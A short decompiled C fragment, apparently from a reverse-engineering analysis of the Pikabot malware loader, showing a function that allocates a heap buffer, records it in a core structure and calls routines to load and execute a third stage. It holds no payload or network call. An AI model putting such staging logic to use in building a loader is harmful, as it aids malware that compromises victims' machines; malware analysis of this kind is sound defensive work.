void thisway2(void)
{
    // ...
    ptr2Stage3 = pikabot_RtlAllocateHeap(0x100000);
    *(undefined4 *)(pikabot_core_ref + 0x4c) = ptr2Stage3;
    *(undefined4 *)(pikabot_core + 0x50) = 0; // size of stage3 buffer
    load_stage3();
    execute_stage3();
    return;
}



